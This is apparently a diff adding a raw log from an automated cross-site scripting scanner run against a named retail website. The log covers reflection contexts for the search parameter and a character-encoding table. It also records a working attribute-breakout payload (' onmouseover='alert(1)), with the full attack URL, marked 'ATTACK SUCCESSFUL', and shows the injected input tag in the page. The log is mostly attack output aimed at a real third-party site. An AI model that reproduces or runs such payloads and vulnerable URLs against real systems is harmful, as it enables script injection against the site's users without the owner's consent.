@@ -1,0 +1,52 @@
+https://www.paradestore.com/index.php/military/army.html
+
+GET Params:[1]
+['q']
+_______________________________________________________________________________________________________
+https://www.paradestore.com/index.php/catalogsearch/result/?q=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [1]
+<input id="search" type="text" name="q" value="(uvw&quot;xyz'yxz&lt;/zxy" class="input-text" maxlength="128" />
+
+----------------------------------------------------------------------------------
+HTML Context: [3]
+<title>Search results for: '(uvw&quot;xyz'yxz&lt;/zxy' - Glendale Parade Store</title>
+<strong>Search results for: '(uvw&quot;xyz'yxz&lt;/zxy'</strong>
+<h1>Search results for '(uvw&quot;xyz'yxz&lt;/zxy'</h1>
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.paradestore.com/index.php/catalogsearch/result/?q=' onmouseover='alert(1)
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input id="search" type="text" name="q" value="' onmouseover='alert(1)" class="input-text" maxlength="128" />
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	False	True	False
+
+Attack Payloads for HTML
+[]
